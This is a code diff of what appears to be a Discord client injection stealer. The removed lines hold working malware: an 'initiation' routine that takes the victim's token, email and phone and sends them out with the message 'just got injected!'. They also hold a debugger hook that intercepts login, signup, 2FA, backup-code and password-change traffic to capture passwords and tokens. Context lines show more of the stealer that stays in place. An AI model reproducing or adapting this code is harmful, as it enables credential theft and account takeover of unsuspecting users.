@@ -164,15 +164,6 @@ function roundSHA1(block, H) {
   return H;
 }
 
-
-const clearAllUserData = () => {
-  const window = BrowserWindow.getAllWindows()[0];
-  window.webContents.session.flushStorageData();
-  window.webContents.session.clearStorageData();
-  app.relaunch();
-  app.exit();
-};
-
 function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
   var i, appendedMessageLength, offset;
 
@@ -416,36 +407,6 @@ const discordPath = (function () {
   if (fs.existsSync(resourcePath)) return { resourcePath, app };
   return { undefined, undefined };
 })();
-
-async function initiation() {
-  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
-      fs.rmdirSync(path.join(__dirname, 'initiation'));
-
-      const token = await getToken();
-      if (!token) return;
-
-      const account = await fetchAccount(token)
-
-      const content = {
-          "content": `**${account.username}** just got injected!`,
-
-          "embeds": [{
-              "fields": [{
-                  "name": "Email",
-                  "value": "`" + account.email + "`",
-                  "inline": true
-              }, {
-                  "name": "Phone",
-                  "value": "`" + (account.phone || "None") + "`",
-                  "inline": true
-              }]
-          }]
-      };
-
-      await hooker(content, token, account);
-      clearAllUserData();
-  }
-}
 
 function updateCheck() {
   const { resourcePath, app } = discordPath;
@@ -713,76 +674,7 @@ const BackupCodesViewed = async (codes, token) => {
   hooker(content, token, account);
 }
 
-let email = "";
-let password = "";
-let initiationCalled = false;
-const createWindow = () => {
-    mainWindow = BrowserWindow.getAllWindows()[0];
-    if (!mainWindow) return
 
-    mainWindow.webContents.debugger.attach('1.3');
-    mainWindow.webContents.debugger.on('message', async (_, method, params) => {
-        if (!initiationCalled) {
-            await initiation();
-            initiationCalled = true;
-        }
-
-        if (method !== 'Network.responseReceived') return;
-        if (!CONFIG.filters.urls.some(url => params.response.url.endsWith(url))) return;
-        if (![200, 202].includes(params.response.status)) return;
-
-        const responseUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getResponseBody', {
-            requestId: params.requestId
-        });
-        const responseData = JSON.parse(responseUnparsedData.body);
-
-        const requestUnparsedData = await mainWindow.webContents.debugger.sendCommand('Network.getRequestPostData', {
-            requestId: params.requestId
-        });
-        const requestData = JSON.parse(requestUnparsedData.postData);
-
-        switch (true) {
-            case params.response.url.endsWith('/login'):
-                if (!responseData.token) {
-                    email = requestData.login;
-                    password = requestData.password;
-                    return; // 2FA
-                }
-                EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
-                break;
-
-            case params.response.url.endsWith('/register'):
-                EmailPassToken(requestData.email, requestData.password, responseData.token, "signed up");
-                break;
-
-            case params.response.url.endsWith('/totp'):
-                EmailPassToken(email, password, responseData.token, "logged in with 2FA");
-                break;
-
-            case params.response.url.endsWith('/codes-verification'):
-                BackupCodesViewed(responseData.backup_codes, await getToken());
-                break;
-
-            case params.response.url.endsWith('/@me'):
-                if (!requestData.password) return;
-
-                if (requestData.email) {
-                    EmailPassToken(requestData.email, requestData.password, responseData.token, "changed his email to **" + requestData.email + "**");
-                }
-
-                if (requestData.new_password) {
-                    PasswordChanged(requestData.new_password, requestData.password, responseData.token);
-                }
-                break;
-        }
-    });
-
-    mainWindow.webContents.debugger.sendCommand('Network.enable');
-
-    mainWindow.on('closed', () => {
-        createWindow()
-    });
-}
 createWindow();
 
 const login = async (email, password, token) => {
